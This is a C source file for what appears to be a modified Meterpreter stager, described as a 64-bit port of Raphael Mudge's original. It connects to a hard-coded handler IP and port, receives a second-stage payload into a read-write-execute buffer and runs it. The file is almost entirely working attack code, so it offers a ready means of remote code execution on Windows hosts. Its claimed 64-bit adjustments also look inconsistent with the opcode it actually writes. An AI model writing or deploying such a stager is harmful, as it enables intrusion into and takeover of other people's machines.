/*
Author : reg1reg1
Modified 64-bit Version of the stager written by Raphael Mudge
The original 32 bit version is here, and it has the mailing pipelines as well
Changed the bytes to match 64 bit version. 
MOV EDI changed to MOV RDI 
This gets caught by the antivirus on Win 10 with Malware detection in the link
https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?name=Behavior%3aWin32%2fMeterpreter.gen!A&threatid=2147723573
*/

#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
void winsock_init() {
	WSADATA	wsaData;
	WORD 		wVersionRequested;

	wVersionRequested = MAKEWORD(2, 2);

	if (WSAStartup(wVersionRequested, &wsaData) < 0) {
		printf("ws2_32.dll is out of date.\n");
		WSACleanup();
		exit(1);
	}
}

/* a quick routine to quit and report why we quit */
void punt(SOCKET my_socket, char * error) {
	printf("Bad things: %s\n", error);
	closesocket(my_socket);
	WSACleanup();
	exit(1);
}

/* attempt to receive all of the requested data from the socket */
int recv_all(SOCKET my_socket, void * buffer, int len) {
	int    tret   = 0;
	int    nret   = 0;
	void * startb = buffer;
	while (tret < len) {
		nret = recv(my_socket, (char *)startb, len - tret, 0);
		startb += nret;
		tret   += nret;

		if (nret == SOCKET_ERROR)
			punt(my_socket, "Could not receive data");
	}
	return tret;
}

/* establish a connection to a host:port */
SOCKET wsconnect(char * targetip, int port) {
	struct hostent *target;
	struct sockaddr_in 	sock;
	SOCKET 	my_socket;

	/* setup our socket */
	my_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (my_socket == INVALID_SOCKET)
		punt(my_socket, "Could not initialize socket");

	/* resolve our target */
	target = gethostbyname(targetip);
	if (target == NULL)
		punt(my_socket, "Could not resolve target");


	/* copy our target information into the sock */
	memcpy(&sock.sin_addr.s_addr, target->h_addr, target->h_length);
	sock.sin_family = AF_INET;
	sock.sin_port = htons(port);

	/* attempt to connect */
	if ( connect(my_socket, (struct sockaddr *)&sock, sizeof(sock)) )
		punt(my_socket, "Could not connect to target");

	return my_socket;
}


int hook_startup(int argc, char * argv[]) {
	ULONG32 size;
	char * buffer;
	void (*function)();

	winsock_init();

	/* connect to the handler */
	SOCKET my_socket = wsconnect("192.168.0.104", 9000);

	/* read the 4-byte length */
	//These 4 bytes specify the address of the payload by meterpreter
	int count = recv(my_socket, (char *)&size, 4, 0);
	if (count != 4 || size <= 0)
		punt(my_socket, "read a strange or incomplete length value\n");

	/* allocate a RWX buffer */
	//Allocate 5 bytes for i386 architectures
	buffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (buffer == NULL)
		punt(my_socket, "could not allocate buffer\n");

	/* prepend a little assembly to move our SOCKET value to the EDI register
	   thanks mihi for pointing this out
	   BF 78 56 34 12     =>      mov edi, 0x12345678 */
	//buffer[0] = 0x48;
	buffer[0] = 0xBF; //comment out for 32 bit system

	/* commented i386 (32 bit systems)*/
	//memcpy(buffer + 1, &my_socket, 4);
	memcpy(buffer + 1, &my_socket, 4);

	/* read bytes into the buffer */
	//count = recv_all(my_socket, buffer + 5, size);
	count = recv_all(my_socket, buffer + 5, size);

	/* cast our buffer as a function and call it */
	function = (void (*)())buffer;
	function();

	return 0;
}
